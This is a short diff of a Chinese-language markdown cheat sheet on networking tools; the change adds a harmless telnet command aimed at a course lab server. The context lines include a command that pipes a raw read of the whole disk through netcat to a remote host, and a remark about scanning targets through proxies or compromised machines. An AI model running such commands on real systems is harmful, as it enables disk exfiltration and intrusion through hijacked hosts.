@@ -217,6 +217,9 @@ dd if=/dev/sda | nc -nv 1.1.1.1 333 -q l # 读入标准流
 
 远程连接到上代理/ 肉鸡  通过 别人对目标机 进行扫描.
 
+## telnet 命令
+telnet cs144.keithw.org http
+
 ## TCPDUMP
 
 抓包命令
